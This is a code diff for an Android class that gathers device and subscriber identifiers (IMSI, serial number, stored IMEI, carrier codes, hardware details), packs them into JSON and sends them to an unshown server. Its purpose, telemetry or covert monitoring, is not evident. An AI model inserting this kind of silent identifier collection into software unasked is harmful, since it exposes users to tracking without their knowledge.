@@ -1,9 +1,11 @@
 package com.inet.android.info;
 
 import java.lang.reflect.Method;
+import java.util.List;
 
-import com.inet.android.db.RequestDataBaseHelper;
-import com.inet.android.db.RequestWithDataBase;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -15,6 +17,12 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 
+import com.inet.android.convertdate.ConvertDate;
+import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.db.RequestWithDataBase;
+import com.inet.android.request.DataRequest;
+import com.inet.android.utils.Logging;
+
 public class GetInfo {
 	static Context mContext;
 	static SharedPreferences sp;
@@ -22,7 +30,9 @@ public class GetInfo {
 	static TelephonyManager telephonyManager;
 	static int networkType;
 	TelephonyInfo telephonyInfo;
-	RequestDataBaseHelper db;
+	private String LOG_TAG = "GetIfo";
+	String callTypeStr = "1";
+	ConvertDate date;
 
 	public GetInfo(Context mContext) {
 		GetInfo.mContext = mContext;
@@ -30,21 +40,19 @@ public class GetInfo {
 	}
 
 	public void getInfo() {
+		date = new ConvertDate();
 
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		telephonyManager = (TelephonyManager) mContext
 				.getSystemService(Context.TELEPHONY_SERVICE);
 		telephonyInfo = TelephonyInfo.getInstance(mContext);
-		db = new RequestDataBaseHelper(mContext);
 
 		// Вставляем контакты
-		Log.d("Insert: ", "Inserting ..");
-		db.addRequest(new RequestWithDataBase(getBrand()));
-		db.addRequest(new RequestWithDataBase(getModel()));
+		Logging.doLog(LOG_TAG, "Insert: ", "Inserting ..");
 
-		Log.d("GetInfo", "	PhoneInfo:" + "\n" + getBrand() + "\n" + getModel()
-				+ "\n" + getIMEI() + "\n" + getIMSI() + "\n" + getSerialNum()
-				+ "\n" + getManufactured() + "\n" + getProduct() + "\n"
+		Logging.doLog(LOG_TAG, "	PhoneInfo:" + "\n" + getBrand() + "\n"
+				+ getModel() + "\n" + getIMSI() + "\n" + getSerialNum() + "\n"
+				+ getManufactured() + "\n" + getProduct() + "\n"
 				+ getVerAndroid() + "\n" + getSDK() + "\n" + "SIMInfo:" + "\n"
 				+ getIsDualSIM() + "\n" + getIsSIM1Ready() + "\n"
 				+ getIsSIM2Ready() + "\n" + getIMEISim1() + "\n"
@@ -52,7 +60,55 @@ public class GetInfo {
 				+ getPhoneType() + "\n" + getNetworkType() + "\n"
 				+ getConnectType() + "\n" + getOperatorName() + "\n"
 				+ getDisplayInfo());
+		
+		//-------initial json line----------------------
+		String sendJSONStr = null;
+		JSONObject jsonObject = new JSONObject();
+		JSONArray data = new JSONArray();
+		JSONObject info = new JSONObject();
+		JSONObject object = new JSONObject();
+		try {
+			jsonObject.put("account", sp.getString("account", "0000"));
+			jsonObject.put("device", sp.getString("device", "device"));
+			jsonObject.put("imei", sp.getString("imei", "0000"));
+			jsonObject.put("key", System.currentTimeMillis());
 
+			info.put("brand", getBrand());
+			info.put("model", getModel());
+			info.put("imsi", getIMSI());
+			info.put("serial_number", getSerialNum());
+			info.put("manufactured", getManufactured());
+			info.put("product", getProduct());
+			info.put("os_version", getVerAndroid());
+			info.put("sdk", getSDK());
+
+			info.put("is_dual_sim", getIsDualSIM());
+			info.put("imei_sim1", getIsSIM1Ready());
+			info.put("imei_sim2", getIsSIM2Ready());
+			info.put("mcc", getMCC());
+			info.put("mnc", getMNC());
+			info.put("phone_type", getPhoneType());
+			info.put("network_type", getNetworkType());
+			info.put("network", getConnectType());
+			info.put("operator_name", getOperatorName());
+			info.put("screen_size", getDisplayInfo());
+			info.put("ver_app", sp.getString("BUILD", "V_000.1"));
+		
+
+			object.put("time", date.logTime());
+			object.put("type", callTypeStr);
+			object.put("info", info);
+			data.put(object);
+			jsonObject.put("data", data);
+			sendJSONStr = jsonObject.toString();
+		} catch (JSONException e) {
+			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+		}
+		if (sendJSONStr != null) {
+			DataRequest dr = new DataRequest(mContext);
+			dr.sendRequest(sendJSONStr);
+			Logging.doLog(LOG_TAG, sendJSONStr);
+		}
 		// e = sp.edit();
 		// e.putString("BUILD", "A0003 2013-10-03 20:00:00");
 		// e.putString("IMEI", sIMEI);
